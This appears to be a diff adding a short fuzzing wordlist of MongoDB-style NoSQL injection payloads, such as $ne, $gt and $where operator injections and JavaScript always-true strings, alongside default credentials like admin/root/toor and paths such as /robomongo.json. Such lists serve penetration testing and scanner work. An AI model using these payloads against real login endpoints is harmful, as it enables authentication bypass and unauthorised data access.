@@ -1,0 +1,27 @@
+$gt
+$ne
+$nin
+$where: '1 == 1'
+';return 'a'=='a' && ''=='
+/account/login
+/db/robomongo.json
+/metrics
+/posts?authorMatch={
+/robomongo.json
+0;return true
+[$ne]=1
+admin
+password
+root
+toor
+{ $ne: 1 }
+{"$gt": ""}
+{"$gt":""}
+{"$gt":-1}
+{"$ne":""}
+{"$ne":-1}
+{"$nin":1}
+{"$nin":[1]}
+{"&exists":false}
+{$gt: ''}
+|| 1==1
